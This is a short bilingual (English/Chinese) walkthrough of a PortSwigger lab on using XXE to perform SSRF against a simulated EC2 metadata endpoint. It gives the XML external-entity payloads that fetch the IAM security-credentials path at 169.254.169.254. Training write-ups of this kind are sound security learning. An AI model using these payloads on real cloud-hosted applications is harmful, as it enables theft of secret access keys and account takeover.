```
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.





此實驗室具有“檢查庫存”功能，可解析 XML 輸入並在響應中返回任何意外值。

實驗室服務器在默認 URL 上運行（模擬的）EC2 元數據端點，即“http://169.254.169.254/”。 此端點可用於檢索有關實例的數據，其中一些可能是敏感的。

解決實驗室，利用[XXE](https://portswigger.net/web-security/xxe)漏洞進行[SSRF攻擊](https://portswigger.net/web-security/ssrf)，獲取 來自 EC2 元數據端點的服務器的 IAM 秘密訪問密鑰。



```



這題很簡單

它告訴我們這裡URL 有東西看
```
http://169.254.169.254/
```



然後又是 xml 實體
```

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>

```


這題我有沒搞懂原理，請求它會回顯latest，接者加上去會一直跟到重要的目錄，只能說網頁設計的應該是有問題。


最後會發現
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>



```


成功